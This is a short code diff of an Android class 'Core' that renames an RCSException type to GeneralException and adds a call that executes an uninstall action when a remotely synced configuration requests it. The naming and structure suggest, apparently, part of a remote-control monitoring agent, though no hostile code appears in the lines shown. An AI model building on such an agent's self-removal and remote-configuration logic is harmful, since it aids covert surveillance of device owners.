@@ -238,7 +238,7 @@ public class Core extends Activity implements Runnable {
 			Log.d("QZ", TAG + " Core initialized");
 			return true;
 
-		} catch (final RCSException rcse) {
+		} catch (final GeneralException rcse) {
 			rcse.printStackTrace();
 			Log.d("QZ", TAG + " RCSException() detected");
 		} catch (final Exception e) {
@@ -255,10 +255,10 @@ public class Core extends Activity implements Runnable {
 	 * conf.
 	 * 
 	 * @return false if no correct conf available
-	 * @throws RCSException
+	 * @throws GeneralException
 	 *             the rCS exception
 	 */
-	public boolean loadConf() throws RCSException {
+	public boolean loadConf() throws GeneralException {
 		boolean loaded = false;
 
 		// tries to load the file got from the sync, if any.
@@ -339,6 +339,9 @@ public class Core extends Activity implements Runnable {
 
 				if (subAction.wantUninstall()) {
 					Log.d("QZ", TAG + " Warn: (CheckActions): uninstalling");
+					
+					UninstallAction.actualExecute();
+					
 					exit = Exit.UNINSTALL;
 					break;
 					// return false;
